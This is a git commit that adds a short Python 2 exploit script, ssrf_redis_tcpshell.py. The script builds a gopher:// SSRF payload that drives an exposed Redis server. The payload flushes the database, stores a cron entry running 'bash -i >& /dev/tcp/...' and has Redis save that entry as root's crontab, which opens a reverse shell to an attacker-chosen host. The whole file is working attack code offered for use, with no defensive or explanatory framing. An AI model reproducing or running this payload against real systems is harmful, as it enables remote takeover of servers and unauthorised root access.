4d1499ccd6dc1d69b78fb9e6086366ae54d1be4b
Ioak <forwarding2020@aliyun.com>
2022-08-02 19:12:03 +0800

    Create ssrf_redis_tcpshell.py

---
+++ ssrf_redis_tcpshell.py
@@ -0,0 +1,34 @@
+import urllib
+
+redis_ip = "172.20.x.x"
+redis_port = "6379"
+reverse_ip = "10.158.x.x"
+reverse_port = "1234"
+shell = "\n\n\n\n* * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip, reverse_port)
+path = "/var/spool/cron"
+filename = "root"
+passwd = ""
+cmd = ["flushall",
+     "set 1 {}".format(shell.replace(" ","${IFS}")),
+     "config set dir {}".format(path),
+     "config set dbfilename {}".format(filename),
+     "save"
+     ]
+if passwd:
+    cmd.insert(0, "AUTH {}".format(passwd))
+
+def redis_format(arr):
+    CRLF = "\r\n"
+    redis_arr = arr.split(" ")
+    cmd = ""
+    cmd += "*" + str(len(redis_arr))
+    for x in redis_arr:
+        cmd += CRLF + "$" + str(len((x.replace("${IFS}", " ")))) + CRLF + x.replace("${IFS}", " ")
+    cmd += CRLF
+    return cmd
+
+if __name__=="__main__":
+    payload = "gopher://" + redis_ip + ":" + redis_port + "/_"
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print urllib.quote(payload)
